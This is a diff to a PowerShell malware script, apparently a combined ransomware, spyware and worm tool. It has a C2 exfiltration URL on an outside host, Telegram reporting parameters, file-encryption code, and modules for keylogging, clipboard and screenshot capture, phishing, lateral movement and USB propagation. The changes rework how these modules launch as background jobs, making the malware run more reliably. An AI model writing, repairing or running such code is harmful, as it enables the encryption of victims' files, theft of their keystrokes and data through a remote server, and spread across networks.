@@ -24,12 +24,25 @@ param(
     [switch]$Ransomware,
     [switch]$Phishing,
     [switch]$Spread,
+    [switch]$NoMain,
     [string]$C2Url = "https://deploy-delta-eosin.vercel.app/api/exfil",
     [string]$TelegramToken = "",
     [string]$ChatId = ""
 )
 
+# ========== HELPER FUNCTIONS ==========
+function Start-ThreadJob ($Function) {
+    Start-Job -ScriptBlock {
+        param($path, $sess, $mach, $func)
+        . $path -NoMain
+        $global:SESSION_ID = $sess
+        $global:MACHINE_ID = $mach
+        & $func
+    } -ArgumentList $PSCommandPath, $SESSION_ID, $MACHINE_ID, $Function | Out-Null
+}
+
 # ========== CONFIGURATION ==========
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $C2_URL = $C2Url
 $TELEGRAM_TOKEN = $TelegramToken
 $CHAT_ID = $ChatId
@@ -649,10 +662,8 @@ function Invoke-Ransomware {
     $encryptedCount = 0
     $failedFiles = @()
     
-    $results = $allFiles | ForEach-Object -Parallel {
+    $results = $allFiles | ForEach-Object {
         $file = $_
-        $aesKey = $using:aesKey
-        $aesIV = $using:aesIV
         
         try {
             $content = [IO.File]::ReadAllBytes($file.FullName)
@@ -671,7 +682,7 @@ function Invoke-Ransomware {
         catch {
             @{ status = 'error'; file = $file.FullName }
         }
-    } -ThrottleLimit 10
+    }
     
     $successes = @($results | Where-Object { $_.status -eq 'success' })
     if ($successes) { $encryptedCount = $successes.Count }
@@ -1153,9 +1164,7 @@ function Invoke-Main {
     Invoke-Evasion
   
     # Start C2 heartbeat in background
-    $c2Job = [System.Threading.Thread]::new({ Start-C2Communication })
-    $c2Job.IsBackground = $true
-    $c2Job.Start()
+    Start-ThreadJob 'Start-C2Communication'
   
     # Start spyware collection
     Invoke-Spyware
@@ -1165,9 +1174,9 @@ function Invoke-Main {
   
     # Module selection
     if ($Full -or $Keylogger) {
-        [System.Threading.Thread]::new({ Invoke-Keylogger }).Start()
-        [System.Threading.Thread]::new({ Invoke-ClipboardMonitor }).Start()
-        [System.Threading.Thread]::new({ Invoke-Screenshot }).Start()
+        Start-ThreadJob 'Invoke-Keylogger'
+        Start-ThreadJob 'Invoke-ClipboardMonitor'
+        Start-ThreadJob 'Invoke-Screenshot'
     }
   
     if ($Full -or $Ransomware) {
@@ -1176,12 +1185,12 @@ function Invoke-Main {
     }
   
     if ($Full -or $Phishing) {
-        [System.Threading.Thread]::new({ Invoke-Phishing }).Start()
+        Start-ThreadJob 'Invoke-Phishing'
     }
   
     if ($Full -or $Spread) {
         Invoke-LateralMovement
-        [System.Threading.Thread]::new({ Invoke-USBPropagation }).Start()
+        Start-ThreadJob 'Invoke-USBPropagation'
     }
   
     if ($Full) {
@@ -1195,10 +1204,12 @@ function Invoke-Main {
 }
 
 # Run
-try {
-    Invoke-Main
-}
-catch {
-    Write-Log "[FATAL] $_"
-    $_.Exception.ToString() | Out-File "$env:TEMP\ransim_error.log" -Append
+if (-not $NoMain) {
+    try {
+        Invoke-Main
+    }
+    catch {
+        Write-Log "[FATAL] $_"
+        $_.Exception.ToString() | Out-File "$env:TEMP\ransim_error.log" -Append
+    }
 }
